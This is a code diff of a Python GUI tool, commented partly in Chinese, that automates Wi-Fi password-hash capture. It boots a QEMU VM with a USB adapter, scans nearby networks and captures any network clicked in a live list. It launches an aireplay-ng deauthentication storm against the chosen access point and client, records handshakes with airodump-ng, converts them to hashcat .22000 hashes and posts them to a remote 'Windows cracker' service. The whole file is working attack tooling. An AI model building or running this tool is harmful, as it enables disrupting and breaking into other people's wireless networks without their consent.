@@ -3,16 +3,16 @@
 """
 Mac WiFi Capture App (double-click GUI)
 ========================================
-Pipeline: launch QEMU (Alpine qcow2 + custom initramfs + DWA-160 USB)
-          -> wait for boot + firmware load
-          -> SSH into VM, set wlan0 monitor mode
-          -> airodump-ng + aireplay-ng deauth storm (target SSID/BSSID/ch)
-          -> hcxpcapngtool -> .22000 hash
-          -> POST hash to Windows cracker (port 8766)
+Pipeline:
+  1. on open -> auto-boot QEMU (Alpine qcow2 + custom initramfs + DWA-160 USB)
+  2. CONTINUOUSLY scan + show a live Wi-Fi list (SSID/BSSID/Ch/Signal).
+     Click a row -> target auto-fills. Double-click a row -> capture it directly.
+  3. capture: airodump-ng + aireplay-ng deauth storm on the selected target
+  4. hcxpcapngtool -> .22000 hash -> save local ({SSID}_{date}.22000) + POST to Windows
 No terminal interaction required (this GUI drives everything).
 """
 import tkinter as tk
-from tkinter import scrolledtext, messagebox
+from tkinter import scrolledtext, ttk
 import subprocess
 import threading
 import time
@@ -30,6 +30,10 @@ SERIAL_LOG  = '/tmp/vm_app_serial.log'
 MON_SOCK    = '/tmp/vm_app_monitor.sock'
 SSH_KEY     = os.path.expanduser('~/.ssh/vm_tongbao')
 
+# DWA-160 USB ids (decimal, as reported by ioreg)
+DWA_VENDOR  = '5263'    # 0x148f
+DWA_PRODUCT = '21874'   # 0x5572
+
 # ---------- local offline hash store (on the Mac) ----------
 # 檔名 = {SSID}_{YYYY-MM-DD}.22000（每個 Wi-Fi 每天一個檔，命名清楚）
 LOCAL_DIR   = os.path.expanduser('~/MacCapture/captures')
@@ -46,6 +50,16 @@ def local_hash_files():
         return []
     return sorted(os.path.join(LOCAL_DIR, f) for f in os.listdir(LOCAL_DIR) if f.endswith('.22000'))
 
+def freq_to_channel(freq):
+    """MHz -> channel. 2.4GHz ch1-13; 5GHz ch36+."""
+    try:
+        f = int(freq)
+    except Exception:
+        return 0
+    if f < 2483:
+        return max(1, min(13, round((f - 2407) / 5)))
+    return max(36, round((f - 5000) / 5))
+
 # ---------- defaults (32H10F) ----------
 DEFAULTS = {
     'ssid':       '32H10F',
@@ -61,57 +75,109 @@ VM_SSH = ('ssh -i %s -p 2222 -o ConnectTimeout=20 -o StrictHostKeyChecking=no '
 
 
 class MacCaptureApp:
-    def __init__(self, root):
+    def __init__(self, root, autostart=True):
         self.root = root
-        root.title('Mac WiFi Capture  (DWA-160  →  32H10F)')
-        root.geometry('760x560')
+        root.title('Mac WiFi Capture  (DWA-160  →  即時 Wi-Fi 列表)')
+        root.geometry('880x680')
         self.var = {}
+        # scan-loop state
+        self._scan_paused = threading.Event()   # set => scan paused (capture running)
+        self._scan_stop   = threading.Event()   # set => stop the scan loop
+        self._autostart   = autostart
 
-        tk.Label(root, text='Target', font=('', 13, 'bold')).grid(
-            row=0, column=0, sticky='w', padx=12, pady=(8, 2))
-        fields = [('ssid', 'SSID'), ('bssid', 'BSSID'),
-                  ('channel', 'Channel'), ('client', 'Client MAC (deauth 目標)')]
-        r = 1
-        for key, label in fields:
-            tk.Label(root, text=label).grid(row=r, column=0, sticky='e', padx=12, pady=3)
+        # ===== row 0: status bar (USB + scan status) =====
+        status = tk.Frame(root)
+        status.grid(row=0, column=0, columnspan=2, sticky='ew', padx=10, pady=(8, 2))
+        self.usb_label = tk.Label(status, text='🔌 USB DWA-160: 🔍 檢查中...', fg='#555555')
+        self.usb_label.pack(side='left')
+        tk.Button(status, text='🔍 檢查', command=self.on_check_usb).pack(side='left', padx=8)
+        self.scan_status = tk.Label(status, text='📡 開機中（VM 啟動 ~95s）...', fg='#0066cc', font=('', 10, 'bold'))
+        self.scan_status.pack(side='left', padx=8)
+
+        # ===== row 1: live Wi-Fi list (Treeview + scrollbar), expandable =====
+        tree_frame = tk.Frame(root)
+        tree_frame.grid(row=1, column=0, columnspan=2, sticky='nsew', padx=10, pady=4)
+        self.tree = ttk.Treeview(tree_frame,
+                                 columns=('ssid', 'bssid', 'ch', 'sig'),
+                                 show='headings', height=14, selectmode='browse')
+        self.tree.heading('ssid',  text='SSID')
+        self.tree.heading('bssid', text='BSSID')
+        self.tree.heading('ch',    text='Ch')
+        self.tree.heading('sig',   text='Signal')
+        self.tree.column('ssid',  width=190, anchor='w')
+        self.tree.column('bssid', width=150, anchor='w')
+        self.tree.column('ch',    width=50,  anchor='center')
+        self.tree.column('sig',   width=90,  anchor='center')
+        sb = ttk.Scrollbar(tree_frame, orient='vertical', command=self.tree.yview)
+        self.tree.configure(yscrollcommand=sb.set)
+        self.tree.pack(side='left', fill='both', expand=True)
+        sb.pack(side='right', fill='y')
+        self.tree.bind('<Button-1>', self.on_tree_click)
+        self.tree.bind('<Double-1>', self.on_tree_dclick)
+
+        # ===== row 2: target fields (auto-fill from a selected row) =====
+        tf = tk.Frame(root)
+        tf.grid(row=2, column=0, columnspan=2, sticky='ew', padx=10, pady=2)
+        tf.columnconfigure(1, weight=1)
+        tf.columnconfigure(3, weight=1)
+
+        def field(key, label, col, row, width=26):
             self.var[key] = tk.StringVar(value=DEFAULTS[key])
-            tk.Entry(root, textvariable=self.var[key], width=30).grid(
-                row=r, column=1, sticky='w', pady=3)
-            r += 1
-        tk.Label(root, text='Capture 秒數').grid(row=r, column=0, sticky='e', padx=12, pady=3)
-        self.var['duration'] = tk.StringVar(value=DEFAULTS['duration'])
-        tk.Entry(root, textvariable=self.var['duration'], width=12).grid(row=r, column=1, sticky='w', pady=3)
-        r += 1
-        tk.Label(root, text='Windows cracker IP').grid(row=r, column=0, sticky='e', padx=12, pady=3)
-        self.var['windows_ip'] = tk.StringVar(value=DEFAULTS['windows_ip'])
-        tk.Entry(root, textvariable=self.var['windows_ip'], width=18).grid(row=r, column=1, sticky='w', pady=3)
-        r += 1
-        tk.Label(root, text='Port').grid(row=r, column=0, sticky='e', padx=12, pady=3)
+            tk.Label(tf, text=label).grid(row=row, column=col, sticky='e', padx=(4, 4), pady=2)
+            tk.Entry(tf, textvariable=self.var[key], width=width).grid(
+                row=row, column=col + 1, sticky='ew', pady=2, padx=(0, 12))
+
+        field('ssid',    'SSID',         0, 0)
+        field('client',  'Client MAC (deauth)', 2, 0, width=22)
+        field('bssid',   'BSSID',        0, 1)
+        field('duration','Capture 秒數', 2, 1, width=10)
+        field('channel', 'Channel',      0, 2, width=8)
+        field('windows_ip', 'Windows IP', 2, 2, width=18)
         self.var['port'] = tk.StringVar(value=DEFAULTS['port'])
-        tk.Entry(root, textvariable=self.var['port'], width=12).grid(row=r, column=1, sticky='w', pady=3)
-        r += 1
+        tk.Label(tf, text='Port').grid(row=3, column=2, sticky='e', padx=(4, 4), pady=2)
+        tk.Entry(tf, textvariable=self.var['port'], width=10).grid(row=3, column=3, sticky='ew', pady=2, padx=(0, 12))
 
-        self.btn = tk.Button(root, text='▶  開始抓包', command=self.start, font=('', 12, 'bold'))
-        self.btn.grid(row=r, column=0, sticky='e', pady=10, padx=12)
-        self.btn_resend = tk.Button(root, text='🔄 重送本機 hash', command=self.resend, font=('', 11, 'bold'))
-        self.btn_resend.grid(row=r, column=1, sticky='w', pady=10, padx=12)
+        # ===== row 3: buttons =====
+        bf = tk.Frame(root)
+        bf.grid(row=3, column=0, columnspan=2, sticky='ew', padx=10, pady=8)
+        self.btn = tk.Button(bf, text='▶  開始抓包（選中的 Wi-Fi）', command=self.start, font=('', 12, 'bold'))
+        self.btn.pack(side='left', padx=(0, 10))
+        self.btn_scan = tk.Button(bf, text='⏸ 暫停掃描', command=self.on_toggle_scan)
+        self.btn_scan.pack(side='left', padx=6)
+        tk.Button(bf, text='🔄 重送本機 hash', command=self.resend).pack(side='left', padx=6)
+        self.var['resend_file'] = tk.StringVar()
+        self.resend_combo = ttk.Combobox(bf, textvariable=self.var['resend_file'],
+                                         state='readonly', width=28)
+        self.resend_combo.pack(side='left', padx=6)
+        self._refresh_resend_combo()
 
+        # ===== row 4/5: log =====
         tk.Label(root, text='Log', font=('', 11, 'bold')).grid(
-            row=r + 1, column=0, columnspan=2, sticky='w', padx=12)
-        self.log = scrolledtext.ScrolledText(root, height=16, width=84)
-        self.log.grid(row=r + 2, column=0, columnspan=2, padx=12, pady=8)
-        self.logline('就緒。DWA-160 要插上 Mac；Windows cracker 沒開也行（hash 會存本機，之後按「重送」）。')
+            row=4, column=0, columnspan=2, sticky='w', padx=12)
+        self.log = scrolledtext.ScrolledText(root, height=12, width=96)
+        self.log.grid(row=5, column=0, columnspan=2, padx=10, pady=6)
+
+        root.grid_columnconfigure(0, weight=1)
+        root.grid_rowconfigure(1, weight=1)
+
+        self.logline('就緒。DWA-160 要插在 Mac；開機後會自動掃 Wi-Fi，點一列即選、雙擊直接抓。')
         _files = local_hash_files()
         if _files:
             self.logline('💾 本機 hash 檔（%s）：' % LOCAL_DIR)
             for _fp in _files:
-                with open(_fp) as _f:
-                    _n = sum(1 for _line in _f if _line.strip())
-                self.logline('   %s  (%d hash)' % (os.path.basename(_fp), _n))
+                try:
+                    with open(_fp) as _f:
+                        _n = sum(1 for _line in _f if _line.strip())
+                    self.logline('   %s  (%d hash)' % (os.path.basename(_fp), _n))
+                except Exception:
+                    self.logline('   %s' % os.path.basename(_fp))
         else:
             self.logline('💾 本機還沒存過 hash（%s）' % LOCAL_DIR)
 
-    # ---- helpers ----
+        if autostart:
+            threading.Thread(target=self._startup, daemon=True).start()
+
+    # ---------- logging (thread-safe) ----------
     def logline(self, msg):
         def _append():
             self.log.insert('end', msg + '\n')
@@ -122,8 +188,215 @@ class MacCaptureApp:
         except Exception:
             pass
 
+    def _set_scan_status(self, text, color='#0066cc'):
+        def _do():
+            self.scan_status.config(text='📡 ' + text, fg=color)
+        try:
+            self.root.after(0, _do)
+        except Exception:
+            pass
+
+    def set_usb_status(self, found):
+        def _do():
+            if found:
+                self.usb_label.config(text='🔌 USB DWA-160: ✅ 已偵測 (0x148f:0x5572)', fg='#1a7f1a')
+            else:
+                self.usb_label.config(text='🔌 USB DWA-160: ❌ 沒偵測到（要插在 Mac）', fg='#b02020')
+        try:
+            self.root.after(0, _do)
+        except Exception:
+            pass
+
+    # ---------- USB detection ----------
+    def check_usb(self):
+        """DWA-160 present? ioreg (system_profiler returns 0 bytes on some macOS)."""
+        try:
+            r = subprocess.run('ioreg -r -c IOUSBHostDevice', shell=True,
+                               capture_output=True, timeout=30)
+            out = (r.stdout or b'').decode('utf-8', 'replace')
+            found = ('idVendor" = %s' % DWA_VENDOR in out) and \
+                    ('idProduct" = %s' % DWA_PRODUCT in out)
+            if not found:
+                r2 = subprocess.run('system_profiler SPUSBDataType', shell=True,
+                                    capture_output=True, timeout=30)
+                out2 = (r2.stdout or b'').decode('utf-8', 'replace').lower()
+                found = ('148f' in out2) and ('5572' in out2)
+            return found
+        except Exception:
+            return False
+
+    def on_check_usb(self):
+        self.usb_label.config(text='🔌 USB DWA-160: 🔍 檢查中...', fg='#555555')
+        def _chk():
+            found = self.check_usb()
+            self.set_usb_status(found)
+            self.logline('   🔍 USB 檢查: %s' % ('✅ DWA-160 已偵測' if found else '❌ 沒偵測到 DWA-160'))
+        threading.Thread(target=_chk, daemon=True).start()
+
+    # ---------- VM boot / ready ----------
+    def vm_ready(self):
+        """wlan0 exists + firmware loaded (rt2870.bin)."""
+        try:
+            r = subprocess.run(
+                VM_SSH + ' "iw dev 2>/dev/null; echo ---DMESG---; dmesg 2>/dev/null | grep -i \'Firmware detected\' | tail -1"',
+                shell=True, capture_output=True, timeout=25)
+            out = (r.stdout or b'').decode('utf-8', 'replace')
+            return ('wlan0' in out) and ('Firmware detected' in out)
+        except Exception:
+            return False
+
+    def boot_vm(self):
+        missing = [f for f in (QEMU_BIN, QCOW2, KERNEL, INITRD, SSH_KEY) if not os.path.exists(f)]
+        if missing:
+            for f in missing:
+                self.logline('❌ MISSING: %s' % f)
+            self.logline('   /tmp 可能被清掉了 → 重新 build VM。')
+            return False
+        self.logline('   關閉既有 QEMU ...')
+        subprocess.run(['pkill', '-f', 'qemu-system-aarch64'], capture_output=True)
+        time.sleep(2)
+        self.logline('   啟動 QEMU (qcow2 + custom initramfs + DWA-160) ...')
+        os.system('rm -f %s %s' % (SERIAL_LOG, MON_SOCK))
+        cmd = ('%s -machine virt -cpu cortex-a72 -m 4096 -smp 4 '
+               '-drive file=%s,format=qcow2 '
+               '-kernel %s -initrd %s -append "console=ttyAMA0" '
+               '-chardev file,id=s0,path=%s,append=on -serial chardev:s0 '
+               '-netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 '
+               '-device virtio-net-pci,netdev=n0 '
+               '-device qemu-xhci,id=xhci '
+               '-device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572 '
+               '-display none -monitor unix:%s,server,nowait'
+               % (QEMU_BIN, QCOW2, KERNEL, INITRD, SERIAL_LOG, MON_SOCK))
+        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self.logline('   等 95s 開機 + firmware load (rt2870.bin 延遲 ~64-80s) ...')
+        time.sleep(95)
+        self.logline('   等 wlan0 + firmware ready ...')
+        for _ in range(40):
+            if self.vm_ready():
+                self.logline('   ✅ VM 就緒 (wlan0 + firmware)。')
+                return True
+            time.sleep(3)
+        self.logline('   ⚠️ VM 就緒檢查逾時（繼續嘗試）。')
+        return True
+
+    # ---------- continuous scan ----------
+    def _startup(self):
+        self.logline('=== 開機：自動啟動 VM + 持續掃描 Wi-Fi ===')
+        self.on_check_usb()
+        if self.boot_vm():
+            self._set_scan_status('持續掃描中…', '#1a7f1a')
+            self._scan_loop()
+        else:
+            self._set_scan_status('VM 開機失敗', '#b02020')
+
+    def _scan_loop(self):
+        while not self._scan_stop.is_set():
+            if self._scan_paused.is_set():
+                time.sleep(1)
+                continue
+            self._set_scan_status('掃描中…', '#b08000')
+            aps = self.do_scan()
+            if aps:
+                self._update_tree(aps)
+                self._set_scan_status('上次 %s · %d 個 AP · 點一列即選' % (
+                    time.strftime('%H:%M:%S'), len(aps)), '#1a7f1a')
+            else:
+                self._set_scan_status('掃描中…（還沒掃到 AP）', '#b08000')
+            for _ in range(5):
+                if self._scan_stop.is_set():
+                    break
+                time.sleep(1)
+
+    def do_scan(self):
+        script = ('iw dev wlan0 set type monitor 2>/dev/null\n'
+                  'ifconfig wlan0 up 2>/dev/null\n'
+                  'sleep 1\n'
+                  'timeout 20 iw dev wlan0 scan 2>&1\n')
+        try:
+            r = subprocess.run(VM_SSH + ' "sh -s"', input=script.encode(),
+                               capture_output=True, timeout=50, shell=True)
+            out = (r.stdout or b'').decode('utf-8', 'replace')
+            return self.parse_scan(out)
+        except Exception as e:
+            self._set_scan_status('scan 失敗: %s' % e, '#b02020')
+            return []
+
+    @staticmethod
+    def parse_scan(out):
+        aps, order, cur = {}, [], None
+        for raw in out.splitlines():
+            ls = raw.strip()
+            if ls.startswith('BSS '):
+                parts = ls.split()
+                if len(parts) >= 2:
+                    cur = parts[1].lower()
+                    if cur not in aps:
+                        aps[cur] = {'ssid': '', 'ch': 0, 'sig': ''}
+                        order.append(cur)
+            elif ls.startswith('Signal:') and cur:
+                toks = ls.split(':', 1)[1].split()
+                if toks:
+                    aps[cur]['sig'] = toks[0]
+            elif ls.startswith('freq:') and cur:
+                try:
+                    f = int(ls.split(':', 1)[1].split()[0])
+                    aps[cur]['ch'] = freq_to_channel(f)
+                except Exception:
+                    pass
+            elif ls.startswith('SSID:') and cur:
+                aps[cur]['ssid'] = ls.split(':', 1)[1].strip()
+        result = []
+        for b in order:
+            a = aps[b]
+            result.append((a['ssid'] or '(hidden)', b.upper(), str(a['ch']), a['sig']))
+        def sigval(x):
+            try:
+                return float(x[3])
+            except Exception:
+                return 999.0
+        result.sort(key=sigval)  # strongest (most negative dBm) first
+        return result
+
+    def _update_tree(self, aps):
+        def _do():
+            self.tree.delete(*self.tree.get_children())
+            for ssid, bssid, ch, sig in aps:
+                self.tree.insert('', 'end', values=(ssid, bssid, ch, sig))
+        try:
+            self.root.after(0, _do)
+        except Exception:
+            pass
+
+    # ---------- tree interactions ----------
+    def on_tree_click(self, event):
+        sel = self.tree.selection()
+        if not sel:
+            return
+        vals = self.tree.item(sel[0])['values']
+        if len(vals) >= 3:
+            ssid, bssid, ch = vals[0], vals[1], str(vals[2])
+            self.var['ssid'].set(ssid)
+            self.var['bssid'].set(bssid)
+            if ch and ch != '0':
+                self.var['channel'].set(ch)
+            self.logline('🎯 已選目標: %s / %s / ch%s（雙擊該列可直接抓包）' % (ssid, bssid, ch))
+
+    def on_tree_dclick(self, event):
+        self.on_tree_click(event)
+        self.start()
+
+    def on_toggle_scan(self):
+        if self._scan_paused.is_set():
+            self._scan_paused.clear()
+            self.btn_scan.config(text='⏸ 暫停掃描')
+            self.logline('▶ 繼續掃描 Wi-Fi')
+        else:
+            self._scan_paused.set()
+            self.btn_scan.config(text='▶ 繼續掃描')
+            self.logline('⏸ 暫停掃描')
+
+    # ---------- local store / post ----------
     def save_local(self, ssid, hash_lines):
-        """把抓到的 hash 存到 Mac 本機（檔名 = SSID_日期）。離線能力核心。"""
         try:
             os.makedirs(LOCAL_DIR, exist_ok=True)
             path = local_hash_path(ssid)
@@ -138,13 +411,13 @@ class MacCaptureApp:
                         f.write(h + '\n')
             self.logline('   💾 本機已存 %d 個 hash（新增 %d）→ %s' % (
                 len(existing) + len(new), len(new), path))
+            self._refresh_resend_combo()
             return len(new)
         except Exception as e:
             self.logline('   ⚠️ 存本機失敗: %r' % e)
             return 0
 
     def post_hashes(self, hashes, ssid, bssid, wip, port):
-        """把 hash POST 給 Windows cracker。回傳成功數。第一個失敗就停（Windows 沒開）。"""
         posted = 0
         for i, h in enumerate(hashes):
             payload = {'hash': h, 'ssid': ssid, 'bssid': bssid.lower()}
@@ -164,115 +437,118 @@ class MacCaptureApp:
                     break
         return posted
 
+    def _refresh_resend_combo(self):
+        files = local_hash_files()
+        names = ['(全部本機 hash)'] + [os.path.basename(f) for f in files]
+        current = self.var['resend_file'].get() if 'resend_file' in self.var else ''
+        self.resend_combo['values'] = names
+        if current and current in names:
+            self.var['resend_file'].set(current)
+        else:
+            self.var['resend_file'].set(names[0])
+
     def resend(self):
-        """把 Mac 本機存的 hash（所有 SSID_日期.22000）重新 POST 給 Windows。"""
         wip = self.var['windows_ip'].get().strip()
         port = self.var['port'].get().strip()
-        ssid = self.var['ssid'].get().strip()
-        bssid = self.var['bssid'].get().strip().upper()
+        chosen = self.var['resend_file'].get()
         files = local_hash_files()
+        if chosen and chosen != '(全部本機 hash)':
+            files = [f for f in files if os.path.basename(f) == chosen]
         if not files:
-            self.logline('📭 本機沒有存的 hash（%s 沒有 *.22000）' % LOCAL_DIR)
+            self.logline('📭 沒有要重送的 hash 檔')
             return
         all_hashes = []
-        self.logline('📂 本機 hash 檔：')
         for fp in files:
-            with open(fp) as f:
-                hs = [line.strip() for line in f if line.strip()]
-            all_hashes.extend(hs)
-            self.logline('   %s  (%d hash)' % (os.path.basename(fp), len(hs)))
-        seen = set()
-        uniq = []
+            try:
+                with open(fp) as f:
+                    for line in f:
+                        if line.strip():
+                            all_hashes.append(line.strip())
+            except Exception as e:
+                self.logline('   ⚠️ 讀 %s 失敗: %r' % (os.path.basename(fp), e))
+        seen, uniq = set(), []
         for h in all_hashes:
             if h not in seen:
                 seen.add(h)
                 uniq.append(h)
         if not uniq:
-            self.logline('📭 本機 hash 檔全是空的')
+            self.logline('📭 hash 檔全是空的')
             return
-        self.logline('🔄 重送 %d 個本機 hash（%d 檔）到 %s:%s ...' % (len(uniq), len(files), wip, port))
+        ssid = self.var['ssid'].get().strip()
+        bssid = self.var['bssid'].get().strip().upper()
+        self.logline('🔄 重送 %d 個 hash（%s）到 %s:%s ...' % (len(uniq), chosen, wip, port))
         posted = self.post_hashes(uniq, ssid, bssid, wip, port)
         self.logline('   重送完成 %d/%d。%s' % (
             posted, len(uniq),
             '' if posted == len(uniq) else '（沒送完的還在 Mac 本機，Windows 開起來再按重送）'))
 
+    # ---------- capture ----------
     def start(self):
+        if str(self.btn.cget('state')) == 'disabled':
+            self.logline('（抓包進行中，先等一下）')
+            return
         self.btn.config(state='disabled')
         threading.Thread(target=self.run, daemon=True).start()
 
     def run(self):
+        self._scan_paused.set()  # pause scan while capturing (shared wlan0)
         try:
-            ssid    = self.var['ssid'].get().strip()
-            bssid   = self.var['bssid'].get().strip().upper()
-            ch      = self.var['channel'].get().strip()
-            client  = self.var['client'].get().strip().upper()
-            dur     = int(self.var['duration'].get().strip() or '300')
-            wip     = self.var['windows_ip'].get().strip()
-            port    = self.var['port'].get().strip()
+            ssid   = self.var['ssid'].get().strip()
+            bssid  = self.var['bssid'].get().strip().upper()
+            ch     = self.var['channel'].get().strip()
+            client = self.var['client'].get().strip().upper()
+            dur    = int(self.var['duration'].get().strip() or '300')
+            wip    = self.var['windows_ip'].get().strip()
+            port   = self.var['port'].get().strip()
             self.logline('=== Mac WiFi Capture: %s (%s) ch%s, %ss ===' % (ssid, bssid, ch, dur))
 
-            # 1. check required files
             missing = [f for f in (QEMU_BIN, QCOW2, KERNEL, INITRD, SSH_KEY) if not os.path.exists(f)]
             if missing:
                 for f in missing:
                     self.logline('❌ MISSING: %s' % f)
-                self.logline('   /tmp 可能被清掉了 → 重新 build VM，或改用 ~/wifi-vm/。')
+                self.logline('   /tmp 可能被清掉了 → 重新 build VM。')
                 return
 
-            # 2. kill existing QEMU
-            self.logline('[1/6] 關閉既有 QEMU ...')
-            subprocess.run(['pkill', '-f', 'qemu-system-aarch64'], capture_output=True)
-            time.sleep(2)
+            if self.vm_ready():
+                self.logline('[1/5] VM 已就緒（沿用掃掠開好的 VM，跳過 95s 開機）')
+            else:
+                self.logline('[1/5] 啟動 VM ...')
+                self.boot_vm()
 
-            # 3. launch QEMU
-            self.logline('[2/6] 啟動 QEMU (qcow2 + custom initramfs + DWA-160) ...')
-            os.system('rm -f %s %s' % (SERIAL_LOG, MON_SOCK))
-            cmd = ('%s -machine virt -cpu cortex-a72 -m 4096 -smp 4 '
-                   '-drive file=%s,format=qcow2 '
-                   '-kernel %s -initrd %s -append "console=ttyAMA0" '
-                   '-chardev file,id=s0,path=%s,append=on -serial chardev:s0 '
-                   '-netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 '
-                   '-device virtio-net-pci,netdev=n0 '
-                   '-device qemu-xhci,id=xhci '
-                   '-device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572 '
-                   '-display none -monitor unix:%s,server,nowait'
-                   % (QEMU_BIN, QCOW2, KERNEL, INITRD, SERIAL_LOG, MON_SOCK))
-            qemu_proc = subprocess.Popen(cmd, shell=True,
-                                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            self.logline('   QEMU PID %s。等 95s 開機 + firmware load (rt2870.bin 延遲 load ~64-80s) ...' % qemu_proc.pid)
-            time.sleep(95)
-
-            # 4. SSH in + capture
-            self.logline('[3/6] SSH 進 VM，開抓包 (monitor + airodump + deauth storm %ss) ...' % dur)
+            self.logline('[2/5] SSH 進 VM，開抓包 (monitor + airodump + deauth storm %ss) ...' % dur)
             vm_script = (
                 'set +e\n'
-                # 清舊 /tmp 檔 (qcow2 root 小, 舊 airodump.log 172M 會塞滿 → cap 檔寫不進)
                 'rm -f /tmp/capapp* /tmp/appairodump.log /tmp/appdeauth.log /tmp/airodump.log /tmp/deauth.log 2>/dev/null\n'
                 'rm -f /tmp/capfull* /tmp/captest* /tmp/par* /tmp/fg* /tmp/dbg* /tmp/alone* /tmp/mix* /tmp/fresh* 2>/dev/null\n'
-                # 等 firmware load + wlan0 ready (rt2870.bin 延遲 load 64-80s)
                 'i=0\n'
                 'while [ $i -lt 40 ]; do\n'
                 '  if iw dev 2>/dev/null | grep -q wlan0 && dmesg 2>/dev/null | grep -q "Firmware detected"; then break; fi\n'
                 '  sleep 3; i=$((i+1))\n'
                 'done\n'
+                # monitor mode: must DOWN the iface first or "Resource busy"
+                'ifconfig wlan0 down 2>/dev/null\n'
                 'iw dev wlan0 set type monitor 2>/dev/null\n'
                 'ifconfig wlan0 up 2>&1\n'
                 'sleep 2\n'
                 'pkill -9 -f "airodump-ng|aireplay-ng" 2>/dev/null\n'
                 'sleep 1\n'
                 'rm -f /tmp/capapp* 2>/dev/null\n'
-                # deauth storm 背景 (nohup &)
-                'nohup aireplay-ng --deauth 9999 --ignore-negative-one -a %s -c %s wlan0 > /dev/null 2>&1 &\n'
+                # deauth storm (bg); all fds -> /dev/null so it never holds the
+                # SSH session pipe; pkill -9 before exit releases it (no hang).
+                'nohup aireplay-ng --deauth 9999 --ignore-negative-one -a %s -c %s wlan0 < /dev/null > /dev/null 2>&1 &\n'
                 'sleep 3\n'
-                # airodump 迴圈 (每次 airodump 提前退出, 跑多次累積 capture)
+                # airodump: SIGTERM (timeout) flushes the cap fine once monitor
+                # mode is set correctly (the earlier 0-byte caps were the "Resource
+                # busy" monitor failure, not SIGTERM). Repeat nruns x 10s.
                 'nruns=$((%s / 10)); [ $nruns -lt 1 ] && nruns=1; [ $nruns -gt 30 ] && nruns=30\n'
                 'for i in $(seq 1 $nruns); do\n'
                 '  timeout 10 airodump-ng -w /tmp/capapp -c %s wlan0 > /dev/null 2>&1\n'
                 'done\n'
-                'pkill aireplay-ng 2>/dev/null\n'
+                'pkill -9 aireplay-ng 2>/dev/null\n'
                 'echo "CAP_COUNT:"; ls /tmp/capapp-*.cap 2>/dev/null | wc -l\n'
                 'echo "CAP_TOTAL:"; du -sch /tmp/capapp-*.cap 2>/dev/null | tail -1\n'
                 'ls /tmp/capapp-*.cap 2>/dev/null | xargs hcxpcapngtool -o /tmp/capapp.22000 2>&1 | tail -3\n'
+                'exec 0</dev/null 2>/dev/null\n'
                 'echo "===HASH==="\n'
                 'cat /tmp/capapp.22000 2>/dev/null\n'
                 'echo "===END==="\n'
@@ -289,7 +565,7 @@ class MacCaptureApp:
                                            'CAP_TOTAL', 'processed cap files']):
                     self.logline('   ' + line.strip())
 
-            # extract hash lines
+            self.logline('[3/5] 解析 hash ...')
             hash_lines, in_hash = [], False
             for line in out.splitlines():
                 if '===HASH===' in line:
@@ -300,22 +576,18 @@ class MacCaptureApp:
                     continue
                 if in_hash and line.strip():
                     hash_lines.append(line.strip())
-            self.logline('[4/6] 抓到 %d 行 hash' % len(hash_lines))
+            self.logline('   抓到 %d 行 hash' % len(hash_lines))
             for h in hash_lines:
                 self.logline('   HASH: %s' % (h[:64] + ('...' if len(h) > 64 else '')))
 
-            # 4.5 存本機（離線能力：Windows 沒開也保得住；檔名 = SSID_日期）
+            self.logline('[4/5] 存本機 + POST ...')
             if hash_lines:
                 self.save_local(ssid, hash_lines)
             else:
                 self.logline('   💾 本次 0 hash（本機未新增）')
-
-            # 5. POST to Windows（順手；失敗不丟，本機已有）
-            self.logline('[5/6] POST %d 個 hash 到 Windows %s:%s ...' % (len(hash_lines), wip, port))
             posted = self.post_hashes(hash_lines, ssid, bssid, wip, port) if hash_lines else 0
 
-            # 6. result
-            self.logline('[6/6] 完成。POST 成功 %d/%d。%s' % (
+            self.logline('[5/5] 完成。POST 成功 %d/%d。%s' % (
                 posted, len(hash_lines),
                 '✅ 成功' if posted > 0 else '⚠️ 0 hash（PMKSA timing → 重跑或加大 capture 秒數）'))
             self.logline('=== 結束 ===')
@@ -323,10 +595,10 @@ class MacCaptureApp:
             self.logline('ERROR: %r' % e)
         finally:
             self.btn.config(state='normal')
-            # leave QEMU running so user can re-run without re-boot; kill on next start
+            self._scan_paused.clear()  # resume scan
 
     def on_close(self):
-        # optional: stop QEMU on close
+        self._scan_stop.set()
         subprocess.run(['pkill', '-f', 'qemu-system-aarch64'], capture_output=True)
         self.root.destroy()
 
